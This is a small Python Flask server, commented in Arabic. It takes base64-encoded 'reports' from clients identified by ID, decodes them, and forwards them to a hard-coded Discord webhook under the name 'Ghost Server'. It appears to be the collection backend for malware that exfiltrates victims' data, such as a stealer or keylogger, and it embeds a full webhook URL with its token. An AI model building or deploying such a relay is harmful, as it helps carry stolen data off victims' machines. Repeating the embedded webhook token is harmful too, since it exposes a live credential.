from flask import Flask, request, jsonify
import requests
import base64

app = Flask(__name__)

# ضع رابط الـ Webhook الخاص بك هنا
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1477005798855933965/UGo7IuLJ2B-cp00CizKypWijgIOs5_95klXi75FyNw9C0xKSDchP-8Om5kDSRHIoaVbe"

@app.route('/api/data', methods=['POST'])
def receive_data():
    try:
        data = request.json
        client_id = data.get('id', 'Unknown')
        encoded_content = data.get('content', '')

        # فك تشفير Base64 للبيانات المستلمة
        decoded_bytes = base64.b64decode(encoded_content)
        decoded_content = decoded_bytes.decode('utf-8', errors='ignore')

        # تنسيق الرسالة لإرسالها إلى Discord
        payload = {
            "username": f"Ghost Server - {client_id}",
            "content": f"**[New Report from {client_id}]**\n```\n{decoded_content}\n```"
        }

        # إرسال البيانات إلى Discord
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        
        if response.status_code == 204:
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "discord_error", "code": response.status_code}), 500

    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 400

if __name__ == '__main__':
    # التشغيل على المنفذ 5000 (الافتراضي لرندر)
    app.run(host='0.0.0.0', port=5000)
